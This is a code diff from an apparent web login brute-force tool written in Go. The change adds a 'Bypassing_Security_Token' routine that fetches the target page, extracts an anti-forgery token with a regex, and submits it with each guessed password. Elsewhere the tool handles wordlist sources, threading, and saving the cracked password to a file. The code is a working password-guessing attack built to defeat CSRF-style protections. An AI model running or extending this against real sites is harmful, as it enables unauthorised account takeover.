@@ -2,8 +2,8 @@ package bruteforce
 
 import (
 	"custom-bruteforce/pkg/config"
-	"custom-bruteforce/pkg/site"
 	"custom-bruteforce/pkg/headers"
+	"custom-bruteforce/pkg/site"
 	"custom-bruteforce/pkg/structs"
 	"errors"
 	"fmt"
@@ -11,9 +11,10 @@ import (
 	"net/http"
 	"net/http/cookiejar"
 	"net/url"
+	"regexp"
+	"runtime"
 	"strings"
 	"sync"
-	"runtime"
 )
 
 var Types_Available []string = []string{"list", "file", "stdin"}
@@ -28,6 +29,10 @@ var (
 	Threads int			= config.YAMLConfig.B.Threads
 	NoVerbose bool		= config.YAMLConfig.B.NoVerbose
 	Output	string		= config.YAMLConfig.B.Output
+
+	// Crawl
+	Crawl_Search string = config.YAMLConfig.C.Search
+	Crawl_Name	 string = config.YAMLConfig.C.Name
 )
 
 // some status messages
@@ -40,7 +45,7 @@ type Attack_Result struct {
 	Status		string
 	Password	string
 	Stop 		bool
-	ErrorMessage string `default:"test"`
+	ErrorMessage string
 }
 var Attack Attack_Result
 
@@ -51,6 +56,7 @@ var ErrWrongType   		= errors.New("you specified the wrong source of dictionary,
 var ErrEmptyField  		= errors.New("the field that you want to bruteforce is empty")
 var ErrTooMuchThreads	= errors.New("too much threads for such small wordlist, please decrease amount of threads") 
 var ErrUnixRequired     = errors.New("you can not use this feature on Windows, you can use WSL instead")
+var ErrMissingGroup		= errors.New("error: you forget to add group to the crawl/search option")
 
 // verifying if the list type is correct, currently there is only two types available - file and list
 func verify_type() bool{
@@ -198,6 +204,17 @@ func _run_attack(pass string) error {
 		client.Jar = jar
 
 		values := url.Values{}
+
+		// checking if the token pattern is added
+		if Crawl_Search != "" {
+			// finding the token
+			token, err := Bypassing_Security_Token(&client)
+			if err != nil {
+				Attack = Attack_Result {Status: StatusFinished, Stop: true, ErrorMessage: err.Error()}
+				return nil
+			}
+			values.Set(Crawl_Name, token)
+		} 
 		for _, field := range site.Fields {
 			values.Set(field.Name, field.Value)
 		}
@@ -267,4 +284,34 @@ func WritePasswordToFile(){
 		// writting password to the file
 		ioutil.WriteFile(Output, []byte(Attack.Password), 0644)
 	}
+}
+
+// Crawling out the token
+func Bypassing_Security_Token(client *http.Client) (string, error) {
+	req, err := http.NewRequest(http.MethodGet, site.Host, nil)
+	if err != nil {
+		return "", err
+	}
+	if headers.Is() {
+		for _, header := range headers.Get(){
+			req.Header.Set(header.Name, header.Value)
+		}
+	}
+	resp, err := client.Do(req)
+	if err != nil {
+		return "", err
+	}
+	if resp.StatusCode == http.StatusOK {
+		body, err := ioutil.ReadAll(resp.Body)
+		if err != nil {
+			return "", err
+		}
+		re := regexp.MustCompile(Crawl_Search)
+
+		if len(re.FindSubmatch(body)) != 2 {
+			return "", ErrMissingGroup
+		}
+		return string(re.FindSubmatch(body)[1]), nil
+	}
+	return "", nil
 }
